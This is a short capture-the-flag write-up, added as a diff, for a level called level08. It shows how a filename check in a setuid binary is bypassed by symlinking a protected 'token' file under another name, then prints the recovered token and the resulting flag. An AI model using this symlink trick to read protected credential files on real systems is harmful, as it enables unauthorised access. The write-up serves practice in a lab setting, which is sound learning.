@@ -1,0 +1,29 @@
+Here, we have 2 files called level08 and token
+
+If we try to execute level08, we'll get:
+./level08 [file to read]
+
+So now if we try to execute it with token, we'll get:
+You may not access 'token'
+
+Let's see what is inside the level08 file with "strings level08"
+we can see several important lines such as:
+printf
+strstr
+$s [file to read]
+token
+You may not access '%s'
+
+We can deduce that there is a check with strstr, token, and the file in argument
+So, we need to create a SymLink and name not name it token:
+ln -s ~/token /tmp/whatever
+
+After that, we just have to execute level08 with this link:
+./level08 /tmp/whatever
+
+And it we give us the token: quif5eloekouj29ke0vouxean
+We're not finished, because this token is use to do:
+su flag08
+
+Now, we can getflag and get the flag:
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
